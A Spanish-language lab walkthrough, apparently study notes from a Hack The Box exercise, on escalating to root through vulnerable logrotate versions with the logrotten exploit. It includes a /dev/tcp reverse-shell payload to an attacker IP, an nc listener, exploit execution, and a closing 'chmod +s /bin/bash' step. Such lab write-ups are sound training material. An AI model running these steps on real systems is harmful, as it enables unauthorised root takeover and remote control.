# Explotación de **logrotate** con **logrotten**

## 📌 Introducción
Los sistemas Linux generan grandes cantidades de archivos de registro (**logs**). Para evitar que llenen el disco, se utiliza la herramienta **logrotate**, que archiva o elimina registros antiguos.  
Si los registros no se gestionan correctamente, pueden ocupar demasiado espacio y dificultar la búsqueda de información crítica.

## 🎯 Objetivo
Explotar una versión vulnerable de **logrotate** para obtener una **shell reversa** como usuario privilegiado o root.

## 🛠 Requisitos
Para explotar **logrotate**, se deben cumplir las siguientes condiciones:
1. Tener **permisos de escritura** en los archivos de log.
2. **logrotate** debe ejecutarse como un usuario privilegiado o **root**.
3. La versión del sistema debe ser **vulnerable**. Versiones afectadas:
   - **3.8.6**
   - **3.11.0**
   - **3.15.0**
   - **3.18.0**

Podemos usar pspy para ver si en intervalos regulares de tiempo se ejecuta logrotate.

## 🚀 Explotación con **logrotten**
Si se cumplen los requisitos, podemos usar un exploit prefabricado llamado **logrotten**.  

### **1️⃣ Descarga y compilación del exploit**
Si el sistema de destino permite la compilación, podemos hacerlo directamente allí. De lo contrario, compilamos en una máquina con un kernel similar y transferimos el binario.

```sh
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

### **2️⃣ Creación del payload**

Generamos un payload con una **shell reversa** que se conectará a nuestra máquina atacante (**10.10.14.2:9001** en este caso).

```bash
echo 'bash -p -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
chmod +x payload
```
IMPORTANTE EL -p si no no se ejecutará de forma privilegiada aunque lo ejecute root.
### **3️⃣ Identificación de configuración vulnerable**

Verificamos si **logrotate** tiene la opción `create`, lo que significa que podemos usar el exploit con este método:

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

```

ejemplo de salida:
	 create
Dado que la opción `create` está habilitada, adaptamos el exploit en consecuencia.

### **4️⃣ Configuración del listener en nuestra máquina**

Antes de ejecutar el exploit, iniciamos un **listener** en nuestra máquina para recibir la conexión:
```bash
nc -nlvp 1234

```
### **5️⃣ Ejecución del exploit**

Ejecutamos el exploit indicando el payload y el archivo de log vulnerable:
```bash
./logrotten -p ./payload <path absoluto al log donde tenemos permisos de escritura>

```

Si la explotación es exitosa, recibiremos una conexión en nuestro listener

Ejemplo exitoso:
1. Veo que hay un access.log en /home/htb-student. Si añado contenido a este access.log veo que se crea un access1.log y el access.log no tiene contenido. Si sigo añadiendo contenido se van creando más. Me da que pensar que el logrotate se está ejecutando.
2. Al tener nosotros permisos de escritura en el fichero log, ser una versión de logrotate vulnerable y viendo con pspy que root ejecuta logrotate. Podemos decir que se puede explotar la vulnerabilidad.
3. Creamos el payload con echo `bash -p -i >& /dev/tcp/10.10.14.2/1234 0>&1' > payload`
4. Clonamos el repo de logrotten en la máquina atacante y transferimos el logrotten.c a la máquina víctima y lo compilamos `gcc logrotten.c -o logrotten`
5. Accedemos desde otro terminal a la máquina por SSH para así tener dos terminales activas( a lo mejor hay una mejor forma de hacer esto, y este paso es exclusivo de la máquina esta para forzar la llamada a logrotate desde root.)
6. Nos ponemos en escucha máquina atacante `nc -nvlp 1234`
7. Ejecutamos desde un terminal `./logrotten -p ./payload /home/htb-student/access.log` y desde otro terminal `echo "a">access.log`
8. Antes de que se cierre la sesión, usamos `chmod +s /bin/bash`